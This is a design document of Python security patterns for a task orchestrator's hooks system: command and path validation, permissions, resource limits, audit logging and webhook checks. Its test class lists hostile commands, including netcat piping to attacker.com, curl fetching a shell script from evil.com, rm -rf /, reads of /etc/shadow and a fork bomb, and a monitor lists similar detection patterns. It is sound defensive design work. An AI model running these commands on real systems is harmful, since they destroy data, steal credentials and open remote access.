# Hooks Security Patterns for MCP Task Orchestrator

## Security Architecture Overview

The hooks system must integrate with the existing comprehensive security framework in the MCP Task Orchestrator, following defense-in-depth principles with multiple layers of validation and protection.

## Input Validation Patterns

### 1. Hook Configuration Validation
Based on existing `SecurityValidator` patterns:

```python
class HookConfigurationValidator:
    def __init__(self):
        self.parameter_validator = ParameterValidator()
        self.path_validator = PathValidator() 
        self.xss_validator = XSSValidator()
        
    def validate_hook_config(self, config: Dict[str, Any]) -> Dict[str, Any]:
        """Comprehensive hook configuration validation."""
        
        # Validate command string
        command = self.parameter_validator.validate_string(
            config.get('command', ''),
            'command',
            max_length=1000,
            required=True
        )
        
        # Validate working directory
        working_dir = self.path_validator.validate_file_path(
            config.get('working_directory', '.'),
            base_dir=get_workspace_root(),
            field_name='working_directory'
        )
        
        # Validate timeout
        timeout = self.parameter_validator.validate_integer(
            config.get('timeout', 30),
            'timeout',
            min_value=1,
            max_value=300
        )
        
        # XSS validation for description
        description = self.xss_validator.validate_and_sanitize(
            config.get('description', ''),
            'description'
        )
        
        return {
            'command': command,
            'working_directory': working_dir,
            'timeout': timeout,
            'description': description
        }
```

### 2. Command Injection Prevention
```python
class CommandValidator:
    # Dangerous command patterns
    DANGEROUS_PATTERNS = [
        r';\s*\w+',           # Command chaining
        r'\|\s*\w+',          # Pipe to commands
        r'&&\s*\w+',          # AND chaining
        r'\|\|\s*\w+',        # OR chaining
        r'`[^`]*`',           # Backticks
        r'\$\([^)]*\)',       # Command substitution
        r'>\s*/\w+',          # Redirects to system paths
        r'<\s*/\w+',          # Input from system paths
    ]
    
    # Allowed commands (allowlist approach)
    ALLOWED_COMMANDS = {
        'python', 'pytest', 'black', 'isort', 'mypy', 'flake8',
        'git', 'echo', 'ls', 'cat', 'grep', 'find', 'mkdir',
        'npm', 'yarn', 'node', 'markdownlint'
    }
    
    def validate_command(self, command: str) -> str:
        """Validate command for security."""
        import shlex
        
        # Check for dangerous patterns
        for pattern in self.DANGEROUS_PATTERNS:
            if re.search(pattern, command):
                raise SecurityError(f"Dangerous command pattern detected: {pattern}")
        
        # Parse command safely
        try:
            command_parts = shlex.split(command)
        except ValueError as e:
            raise SecurityError(f"Invalid command syntax: {e}")
        
        if not command_parts:
            raise SecurityError("Empty command not allowed")
        
        # Check against allowlist
        base_command = command_parts[0].split('/')[-1]  # Handle full paths
        if base_command not in self.ALLOWED_COMMANDS:
            raise SecurityError(f"Command not allowed: {base_command}")
        
        return command
```

## Authentication and Authorization Patterns

### 1. Hook Execution Permissions
Based on existing RBAC system:

```python
class HookPermissionManager:
    def __init__(self):
        self.auth_manager = AuthenticationManager()
        self.authz_manager = AuthorizationManager()
        
    def check_hook_execution_permission(self, 
                                      hook_type: str, 
                                      user_context: Optional[Dict] = None) -> bool:
        """Check if user can execute specific hook type."""
        
        # Map hook types to permissions
        hook_permissions = {
            'system': Permission.SYSTEM_CONFIGURATION,
            'task': Permission.EXECUTE_TASK,
            'file': Permission.CREATE_TASK,
            'network': Permission.SYSTEM_CONFIGURATION  # Most restrictive
        }
        
        required_permission = hook_permissions.get(hook_type, Permission.SYSTEM_CONFIGURATION)
        
        # Check authentication if user context provided
        if user_context:
            if not self.auth_manager.verify_session(user_context.get('session_token')):
                return False
            return self.authz_manager.check_permission(
                user_context.get('user_id'), 
                required_permission
            )
        
        # For system hooks, check if running in privileged mode
        return os.getenv('MCP_TASK_ORCHESTRATOR_PRIVILEGED_MODE') == 'true'
```

### 2. API Key Validation for Hook APIs
```python
@mcp_error_handler("hook_configure", require_auth=True)
@require_permission(Permission.SYSTEM_CONFIGURATION)
@mcp_validation_handler(["hook_config"])
async def configure_hooks(args: Dict[str, Any]) -> List[types.TextContent]:
    """Configure hooks with authentication and authorization."""
    
    # Security validation
    hook_config = HookConfigurationValidator().validate_hook_config(args['hook_config'])
    
    # Store securely
    hook_manager = get_hook_manager()
    await hook_manager.configure_hooks(hook_config)
    
    return [types.TextContent(type="text", text="Hooks configured successfully")]
```

## Path Traversal Prevention

### 1. Safe Path Validation
Based on existing `PathValidator`:

```python
class HookPathValidator:
    def __init__(self, workspace_root: Path):
        self.workspace_root = workspace_root.resolve()
        self.path_validator = PathValidator()
        
    def validate_hook_paths(self, hook_config: Dict[str, Any]) -> Dict[str, Any]:
        """Validate all paths in hook configuration."""
        
        # Validate working directory
        if 'working_directory' in hook_config:
            working_dir = self.path_validator.validate_file_path(
                hook_config['working_directory'],
                base_dir=self.workspace_root,
                field_name='working_directory'
            )
            hook_config['working_directory'] = str(working_dir)
        
        # Validate output paths if specified
        if 'output_file' in hook_config:
            output_file = self.path_validator.validate_file_path(
                hook_config['output_file'],
                base_dir=self.workspace_root,
                field_name='output_file'
            )
            hook_config['output_file'] = str(output_file)
        
        return hook_config
```

## Resource Limits and Sandboxing

### 1. Resource Limit Enforcement
```python
class HookResourceManager:
    def __init__(self):
        self.max_execution_time = 300  # 5 minutes
        self.max_memory_mb = 256
        self.max_output_size = 10 * 1024 * 1024  # 10MB
        
    async def execute_with_limits(self, 
                                command: str, 
                                working_dir: Path,
                                timeout: int = None) -> Dict[str, Any]:
        """Execute command with comprehensive resource limits."""
        import asyncio
        import resource
        import tempfile
        import os
        
        timeout = min(timeout or self.max_execution_time, self.max_execution_time)
        
        # Create temporary output file
        with tempfile.NamedTemporaryFile(mode='w+', delete=False) as output_file:
            output_path = output_file.name
        
        try:
            # Preexec function to set resource limits
            def limit_resources():
                # CPU time limit
                resource.setrlimit(resource.RLIMIT_CPU, (timeout, timeout))
                
                # Memory limit
                memory_limit = self.max_memory_mb * 1024 * 1024
                resource.setrlimit(resource.RLIMIT_AS, (memory_limit, memory_limit))
                
                # File size limit
                resource.setrlimit(resource.RLIMIT_FSIZE, (self.max_output_size, self.max_output_size))
                
                # Process limit
                resource.setrlimit(resource.RLIMIT_NPROC, (10, 10))
            
            # Execute command
            proc = await asyncio.create_subprocess_shell(
                f"{command} > {output_path} 2>&1",
                cwd=working_dir,
                preexec_fn=limit_resources,
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL
            )
            
            # Wait with timeout
            try:
                returncode = await asyncio.wait_for(proc.wait(), timeout=timeout)
            except asyncio.TimeoutError:
                proc.kill()
                await proc.wait()
                raise HookExecutionError("Hook execution timed out")
            
            # Read output (with size limit)
            output_size = os.path.getsize(output_path)
            if output_size > self.max_output_size:
                raise HookExecutionError("Hook output exceeds size limit")
            
            with open(output_path, 'r') as f:
                output = f.read()
            
            return {
                'returncode': returncode,
                'output': output,
                'execution_time': timeout,
                'output_size': output_size
            }
            
        finally:
            # Cleanup
            if os.path.exists(output_path):
                os.unlink(output_path)
```

## Audit Logging and Monitoring

### 1. Comprehensive Hook Audit Logging
Based on existing `SecurityAuditLogger`:

```python
class HookAuditLogger:
    def __init__(self):
        self.audit_logger = SecurityAuditLogger()
        
    async def log_hook_execution(self, 
                               hook_name: str,
                               command: str,
                               context: Dict[str, Any],
                               result: Dict[str, Any],
                               user_id: Optional[str] = None) -> None:
        """Log hook execution for security audit."""
        
        # Sanitize sensitive information
        safe_command = self.sanitize_command(command)
        safe_context = self.sanitize_context(context)
        
        await self.audit_logger.log_security_event(
            event_type="hook_execution",
            severity="INFO",
            user_id=user_id,
            details={
                "hook_name": hook_name,
                "command": safe_command,
                "working_directory": safe_context.get('working_directory'),
                "execution_time": result.get('execution_time'),
                "return_code": result.get('returncode'),
                "success": result.get('returncode') == 0,
                "output_size": result.get('output_size')
            },
            correlation_id=context.get('correlation_id')
        )
    
    def sanitize_command(self, command: str) -> str:
        """Sanitize command for logging."""
        # Remove potential secrets (API keys, tokens, passwords)
        patterns = [
            r'--api-key=\S+',
            r'--token=\S+', 
            r'--password=\S+',
            r'-k \S+',
            r'-p \S+'
        ]
        
        sanitized = command
        for pattern in patterns:
            sanitized = re.sub(pattern, '[REDACTED]', sanitized, flags=re.IGNORECASE)
        
        return sanitized
```

### 2. Security Monitoring Integration
```python
class HookSecurityMonitor:
    def __init__(self):
        self.system_monitor = SystemMonitor()
        self.alert_thresholds = {
            'failed_hooks_per_minute': 10,
            'hook_execution_time_seconds': 60,
            'suspicious_command_patterns': 5
        }
        
    def monitor_hook_execution(self, hook_result: Dict[str, Any]) -> None:
        """Monitor hook execution for security anomalies."""
        
        # Track execution metrics
        self.system_monitor.record_metric(
            "hook_execution_time", 
            hook_result.get('execution_time', 0)
        )
        
        if hook_result.get('returncode') != 0:
            self.system_monitor.increment_counter("hook_execution_failures")
            
            # Check failure threshold
            if self.is_threshold_exceeded('failed_hooks_per_minute'):
                self.trigger_security_alert("High hook failure rate detected")
        
        # Monitor suspicious patterns
        command = hook_result.get('command', '')
        if self.contains_suspicious_patterns(command):
            self.system_monitor.increment_counter("suspicious_hook_commands")
            self.trigger_security_alert(f"Suspicious hook command: {command}")
    
    def contains_suspicious_patterns(self, command: str) -> bool:
        """Check for suspicious command patterns."""
        suspicious_patterns = [
            r'/etc/passwd',      # System file access
            r'/etc/shadow',      # Password file access
            r'nc\s+-l',         # Netcat listening
            r'python.*-c.*exec', # Python code execution
            r'curl.*\|.*sh',     # Download and execute
            r'wget.*\|.*sh',     # Download and execute
        ]
        
        return any(re.search(pattern, command, re.IGNORECASE) for pattern in suspicious_patterns)
```

## Error Sanitization

### 1. Safe Error Messages
```python
class HookErrorSanitizer:
    def sanitize_hook_error(self, error: Exception, command: str) -> str:
        """Sanitize hook errors to prevent information disclosure."""
        
        if isinstance(error, SecurityError):
            return "Hook execution blocked by security policy"
        
        elif isinstance(error, HookExecutionError):
            return f"Hook execution failed: {self.sanitize_execution_error(str(error))}"
        
        elif isinstance(error, TimeoutError):
            return "Hook execution timed out"
        
        elif isinstance(error, PermissionError):
            return "Insufficient permissions to execute hook"
        
        else:
            # Log full error details for debugging
            logger.error(f"Hook execution error: {error}", extra={'command': command})
            return "Hook execution failed due to unexpected error"
    
    def sanitize_execution_error(self, error_message: str) -> str:
        """Sanitize command execution error messages."""
        # Remove absolute paths
        error_message = re.sub(r'/[\w/]+/', '[PATH]/', error_message)
        
        # Remove potential secrets
        error_message = re.sub(r'token[:\s=]+\w+', 'token=[REDACTED]', error_message, flags=re.IGNORECASE)
        error_message = re.sub(r'key[:\s=]+\w+', 'key=[REDACTED]', error_message, flags=re.IGNORECASE)
        
        # Limit error message length
        return error_message[:500] + '...' if len(error_message) > 500 else error_message
```

## Network Security Patterns

### 1. Webhook Hook Security
```python
class WebhookHookValidator:
    def __init__(self):
        self.allowed_domains = set()
        self.blocked_ips = set()
        
    def validate_webhook_url(self, url: str) -> str:
        """Validate webhook URL for security."""
        from urllib.parse import urlparse
        import ipaddress
        
        parsed = urlparse(url)
        
        # Only allow HTTPS
        if parsed.scheme != 'https':
            raise SecurityError("Webhook URLs must use HTTPS")
        
        # Validate domain if allowlist configured
        if self.allowed_domains and parsed.hostname not in self.allowed_domains:
            raise SecurityError("Webhook domain not in allowlist")
        
        # Check for private IP addresses
        try:
            ip = ipaddress.ip_address(parsed.hostname)
            if ip.is_private or ip.is_loopback:
                raise SecurityError("Webhook cannot target private IP addresses")
        except ValueError:
            pass  # Not an IP address, domain name is OK
        
        return url
```

## Security Testing Patterns

### 1. Hook Security Test Framework
```python
class HookSecurityTests:
    def __init__(self):
        self.test_vectors = [
            # Command injection tests
            "ls; rm -rf /",
            "ls && cat /etc/passwd", 
            "ls | nc attacker.com 4444",
            "$(curl http://evil.com/shell.sh)",
            
            # Path traversal tests
            "../../../etc/passwd",
            "../../../../../../etc/shadow",
            "/etc/passwd",
            
            # Resource exhaustion tests
            ":(){ :|:& };:",  # Fork bomb
            "cat /dev/zero",  # Memory exhaustion
            "while true; do echo; done",  # CPU exhaustion
        ]
    
    async def test_hook_security(self, hook_config: Dict[str, Any]) -> List[str]:
        """Test hook configuration against security vectors."""
        vulnerabilities = []
        
        for test_vector in self.test_vectors:
            try:
                # Test command validation
                test_config = hook_config.copy()
                test_config['command'] = test_vector
                
                validator = HookConfigurationValidator()
                validator.validate_hook_config(test_config)
                
                # If validation passes, it's a vulnerability
                vulnerabilities.append(f"Command injection vulnerability: {test_vector}")
                
            except SecurityError:
                # Expected - validation should catch this
                continue
            except Exception as e:
                # Unexpected error - potential issue
                vulnerabilities.append(f"Validation error for {test_vector}: {e}")
        
        return vulnerabilities
```

This security framework ensures that the hooks system maintains the same security standards as the rest of the MCP Task Orchestrator while providing comprehensive protection against common attack vectors.